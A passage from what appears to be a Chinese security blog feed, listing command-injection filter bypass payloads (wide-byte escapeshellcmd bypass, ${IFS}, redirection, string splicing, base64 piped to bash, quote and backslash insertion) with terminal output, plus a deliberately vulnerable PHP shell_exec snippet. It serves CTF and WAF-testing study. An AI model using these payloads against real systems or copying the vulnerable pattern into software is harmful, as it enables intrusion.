<h2 id="法二：宽字节注入"><a href="#法二：宽字节注入" class="headerlink" title="法二：宽字节注入"></a>法二：宽字节注入</h2><p>php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;);</div></pre></td></tr></table></figure></p>
<p>之后该语句会变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 繺;id</div></pre></td></tr></table></figure></p>
<p>从而实现 id 命令的注入。</p>
<h1 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h1><h2 id="法一：-IFS"><a href="#法一：-IFS" class="headerlink" title="法一： ${IFS}"></a>法一： ${IFS}</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat flag</div><div class="line">nice day</div><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<h2 id="法二：-重定向符-lt-gt"><a href="#法二：-重定向符-lt-gt" class="headerlink" title="法二： 重定向符&lt;&gt;"></a>法二： 重定向符&lt;&gt;</h2><p>payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ cat&lt;flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="法一：-拼接"><a href="#法一：-拼接" class="headerlink" title="法一： 拼接"></a>法一： 拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ a=c;b=at;c=flag;$a$b $c</div><div class="line">nice day</div></pre></td></tr></table></figure>
<h2 id="法二：-利用已存在的资源"><a href="#法二：-利用已存在的资源" class="headerlink" title="法二： 利用已存在的资源"></a>法二： 利用已存在的资源</h2><p>从已有的文件或者环境变量中获得相应的字符。</p>
<h2 id="法三：-base64编码"><a href="#法三：-base64编码" class="headerlink" title="法三： base64编码"></a>法三： base64编码</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<h2 id="法四：-单引号、双引号"><a href="#法四：-单引号、双引号" class="headerlink" title="法四： 单引号、双引号"></a>法四： 单引号、双引号</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&apos;&apos;ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<h2 id="法五：反斜线"><a href="#法五：反斜线" class="headerlink" title="法五：反斜线 \"></a>法五：反斜线 \</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-207-93-ubuntu:~$ c\at fl\ag</div><div class="line">nice day</div></pre></td></tr></table></figure></p>
<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><h1 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(strlen($_GET[test])&lt;<span class="number">8</span>)&#123;</div><div class="line"><span class="keyword">echo</span> shell_exec($_GET[test]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="文件构造"><a href="#文件构造" class="headerlink" title="文件构造"></a>文件构造</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a&gt;wget</div></pre></td></tr></table></figure></p>
<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1&gt;wget</div></pre></td></tr></table></figure></p>
<p>payload3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;wget</div></pre></td></tr></table></figure></p>
<p>将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.</p>
<h1 id="LINUX下一些已有字符"><a href="#LINUX下一些已有字符" class="headerlink" title="LINUX下一些已有字符"></a>LINUX下一些已有字符</h1><ul>
<li>${PS2} 对应字符 ‘&gt;’</li>
<li>${PS4} 对应字符 ‘+’</li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
<li><a href="https://github.com/ewilded/shelling" target="_blank" rel="external">shelling
</a></li>
</ul>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">PHP绕过open_basedir列目录的研究</a></li>
<li><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="external">eval长度限制绕过 &amp;&amp; PHP5.6新特性</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/nginx-deny-exec-php-file.html" target="_blank" rel="external">关于lnmp目录禁止执行的绕过与正确方法</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">一些不包含数字和字母的webshell</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3271.html" target="_blank" rel="external">php webshell分析和绕过waf技巧</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3192.html" target="_blank" rel="external">【技术分享】命令执行和绕过的一些小技巧</a></li>
<li><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a></li>
<li><a href="http://www.math1as.com/index.php/archives/484" target="_blank" rel="external">Mathias:命令执行的bypass技巧</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;命令执行的一些绕过技巧&lt;br&gt;已收录至: &lt;a href=&quot;https://chybeta.gitbooks.io/waf-bypass/content/ming-ling-zhu-ru/rao-guo-fang-fa.html&quot;&gt;WAF-Bypass&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
</feed>
